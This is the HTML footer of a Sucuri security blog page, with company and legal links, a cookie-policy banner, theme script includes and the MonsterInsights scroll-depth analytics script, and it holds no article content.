</div><div class="widget-area footer-widgets-4 footer-widget-area"><section id="nav_menu-5" class="widget widget_nav_menu"><div class="widget-wrap"><h3 class="widgettitle widget-title">Company</h3>
<div class="menu-footer-company-menu-container"><ul id="menu-footer-company-menu" class="menu"><li id="menu-item-15495" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15495"><a href="https://sucuri.net/company/" itemprop="url">About</a></li>
<li id="menu-item-15496" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15496"><a href="https://sucuri.net/company/media" itemprop="url">Media</a></li>
<li id="menu-item-15497" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15497"><a href="https://sucuri.net/company/events" itemprop="url">Events</a></li>
<li id="menu-item-15498" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15498"><a href="https://sucuri.net/company/employment/" itemprop="url">Employment</a></li>
<li id="menu-item-15499" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15499"><a href="https://sucuri.net/company/contact-us" itemprop="url">Contact</a></li>
<li id="menu-item-15500" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15500"><a href="https://sucuri.net/customers/" itemprop="url">Testimonials</a></li>
</ul></div></div></section>
</div><div class="widget-area footer-widgets-5 footer-widget-area"><section id="text-4" class="widget widget_text"><div class="widget-wrap">			<div class="textwidget"><ul class="social-icons">
<li><a href="https://www.facebook.com/SucuriSecurity"><span class="screen-reader-text">Facebook</span></a></li>
<li><a href="https://twitter.com/sucurisecurity"><span class="screen-reader-text">Twitter</span></a></li>
<li><a href="https://www.linkedin.com/company/sucuri-security"><span class="screen-reader-text">LinkedIn</span></a></li>
<li><a href="https://www.instagram.com/sucurisecurity/"><span class="screen-reader-text">Instagram</span></a></li>
</ul>
<p><a class="button" href="https://dashboard.sucuri.net/login/">Customer Login</a></p>
<p><a class="footer-logo" href="https://sucuri.net/">Sucuri Home</a></p>
</div>
		</div></section>
</div></div></div><div class="site-footer-widget"><div class="wrap"><section id="text-8" class="widget widget_text"><div class="widget-wrap">			<div class="textwidget"><div class="site-footer-links">
<ul>
<li><a href="https://sucuri.net/terms">Terms of Use</a></li>
<li><a href="https://sucuri.net/privacy">Privacy Policy</a></li>
<li><a href="https://sucuri.net/faq/">Frequently Asked Questions</a></li>
</ul>
</div>
<div class="site-footer-copyright">
<p>&#x000A9;&nbsp;2023 Sucuri Inc. All rights reserved</p>
</div>
</div>
		</div></section>
</div></div></footer></div><script type="text/javascript">
ire('identify', {customerId: '​​', customerEmail: '​​'}); </script><div id="cookie-policy-banner" class="container-fluid cookie-policy-banner hide p-0">
        <div class="container">
            <button id="cookie-policy-decline-btn" class="cb-close cb-decline-anchor">X</button>
            <div class="row">
                <div class="c-lg-8">
                    <p class="mb-0 mt-0 highlight green heavy">Sucuri Cookie Policy <br> <a href="https://sucuri.net/cookies" target="_blank" class="bolder no-underline">See our policy>></a></p>
                    <p class="mb-0 mt-0">Our website uses cookies, which help us to improve our site and enables us to deliver the best possible service and customer experience.</p>
                </div>
                <div class="c-lg-4 d-flex justify-items-start mt-15 align-items-center">
                    <button id="cookie-policy-btn" class="btn btn-primary ml-0">Accept</button>
                    <button class="btn cb-decline-anchor auto-track" data-gatrack="Cookie_Click, Decline">Decline</button>
                    <button id="manage-privacy-options" class="btn">Manage Options</button>
                </div>
            </div>
        </div>
    </div><script type="text/javascript">
		/* MonsterInsights Scroll Tracking */
			if ( typeof(jQuery) !== 'undefined' ) {
				jQuery( document ).ready(function(){
					function monsterinsights_scroll_tracking_load() {
						if ( typeof(__gaTracker) !== 'undefined' && __gaTracker && __gaTracker.hasOwnProperty( "loaded" ) && __gaTracker.loaded == true ) {
							(function(factory) {
								factory(jQuery);
							}(function($) {

								/* Scroll Depth */
								"use strict";
								var defaults = {
									percentage: true
								};

								var $window = $(window),
									cache = [],
									scrollEventBound = false,
									lastPixelDepth = 0;

								/*
								 * Plugin
								 */

								$.scrollDepth = function(options) {

									var startTime = +new Date();

									options = $.extend({}, defaults, options);

									/*
									 * Functions
									 */

									function sendEvent(action, label, scrollDistance, timing) {

										var fieldsArray = {
											hitType       : 'event',
											eventCategory : 'Scroll Depth',
											eventAction   : action,
											eventLabel    : label,
											eventValue    : 1,
											nonInteraction: 1
										};

										if ( 'undefined' === typeof MonsterInsightsObject || 'undefined' === typeof MonsterInsightsObject.sendEvent ) {
											return;
										}

										MonsterInsightsObject.sendEvent( fieldsArray );
										if (arguments.length > 3) {
											fieldsArray = {
												hitType        : 'timing',
												timingCategory : 'Scroll Depth',
												timingVar      : action,
												timingValue    : timing,
												timingLabel    : label,
												nonInteraction: 1
											};
											MonsterInsightsObject.sendEvent( fieldsArray );
										}
									}

									function calculateMarks(docHeight) {
										return {
											'25%' : parseInt(docHeight * 0.25, 10),
											'50%' : parseInt(docHeight * 0.50, 10),
											'75%' : parseInt(docHeight * 0.75, 10),
											/* Cushion to trigger 100% event in iOS */
											'100%': docHeight - 5
										};
									}

									function checkMarks(marks, scrollDistance, timing) {
										/* Check each active mark */
										$.each(marks, function(key, val) {
											if ( $.inArray(key, cache) === -1 && scrollDistance >= val ) {
												sendEvent('Percentage', key, scrollDistance, timing);
												cache.push(key);
											}
										});
									}

									function rounded(scrollDistance) {
										/* Returns String */
										return (Math.floor(scrollDistance/250) * 250).toString();
									}

									function init() {
										bindScrollDepth();
									}

									/*
									 * Public Methods
									 */

									/* Reset Scroll Depth with the originally initialized options */
									$.scrollDepth.reset = function() {
										cache = [];
										lastPixelDepth = 0;
										$window.off('scroll.scrollDepth');
										bindScrollDepth();
									};

									/* Add DOM elements to be tracked */
									$.scrollDepth.addElements = function(elems) {

										if (typeof elems == "undefined" || !$.isArray(elems)) {
											return;
										}

										$.merge(options.elements, elems);

										/* If scroll event has been unbound from window, rebind */
										if (!scrollEventBound) {
											bindScrollDepth();
										}

									};

									/* Remove DOM elements currently tracked */
									$.scrollDepth.removeElements = function(elems) {

										if (typeof elems == "undefined" || !$.isArray(elems)) {
											return;
										}

										$.each(elems, function(index, elem) {

											var inElementsArray = $.inArray(elem, options.elements);
											var inCacheArray = $.inArray(elem, cache);

											if (inElementsArray != -1) {
												options.elements.splice(inElementsArray, 1);
											}

											if (inCacheArray != -1) {
												cache.splice(inCacheArray, 1);
											}

										});

									};

									/*
									 * Throttle function borrowed from:
									 * Underscore.js 1.5.2
									 * http://underscorejs.org
									 * (c) 2009-2013 Jeremy Ashkenas, DocumentCloud and Investigative Reporters & Editors
									 * Underscore may be freely distributed under the MIT license.
									 */

									function throttle(func, wait) {
										var context, args, result;
										var timeout = null;
										var previous = 0;
										var later = function() {
											previous = new Date;
											timeout = null;
											result = func.apply(context, args);
										};
										return function() {
											var now = new Date;
											if (!previous) previous = now;
											var remaining = wait - (now - previous);
											context = this;
											args = arguments;
											if (remaining <= 0) {
												clearTimeout(timeout);
												timeout = null;
												previous = now;
												result = func.apply(context, args);
											} else if (!timeout) {
												timeout = setTimeout(later, remaining);
											}
											return result;
										};
									}

									/*
									 * Scroll Event
									 */

									function bindScrollDepth() {

										scrollEventBound = true;

										$window.on('scroll.scrollDepth', throttle(function() {
											/*
											 * We calculate document and window height on each scroll event to
											 * account for dynamic DOM changes.
											 */

											var docHeight = $(document).height(),
												winHeight = window.innerHeight ? window.innerHeight : $window.height(),
												scrollDistance = $window.scrollTop() + winHeight,

												/* Recalculate percentage marks */
												marks = calculateMarks(docHeight),

												/* Timing */
												timing = +new Date - startTime;

											checkMarks(marks, scrollDistance, timing);
										}, 500));

									}

									init();
								};

								/* UMD export */
								return $.scrollDepth;

							}));

							jQuery.scrollDepth();
						} else {
							setTimeout(monsterinsights_scroll_tracking_load, 200);
						}
					}
					monsterinsights_scroll_tracking_load();
				});
			}
		/* End MonsterInsights Scroll Tracking */
		
</script><script type='text/javascript' src='https://blog.sucuri.net/wp-includes/js/hoverIntent.min.js?ver=1.10.2' id='hoverIntent-js'></script>
<script type='text/javascript' src='https://blog.sucuri.net/wp-content/themes/genesis/lib/js/menu/superfish.min.js?ver=1.7.5' id='superfish-js'></script>
<script type='text/javascript' src='https://blog.sucuri.net/wp-content/themes/genesis/lib/js/menu/superfish.args.min.js?ver=2.7.1' id='superfish-args-js'></script>
<script type='text/javascript' src='https://blog.sucuri.net/wp-content/themes/genesis/lib/js/skip-links.min.js?ver=2.7.1' id='skip-links-js'></script>
<script type='text/javascript' src='https://blog.sucuri.net/wp-content/themes/sucuriblog0117/js/theme.js?ver=1.1.0' id='sucuriblog-theme-js-js'></script>
<script type='text/javascript' src='https://blog.sucuri.net/wp-content/themes/sucuriblog0117/js/sticky.js?ver=1.0.4' id='sucuriblog-sticky-js-js'></script>
<script type='text/javascript' src='https://blog.sucuri.net/wp-content/themes/sucuriblog0117/js/sticky-init.js?ver=1.0.1' id='sucuriblog-sticky-js-init-js'></script>
<script type='text/javascript' src='https://blog.sucuri.net/wp-content/themes/sucuriblog0117/js/cookie-banner.js?ver=20200914' id='cookie-banner-js-js'></script>
</body></html>
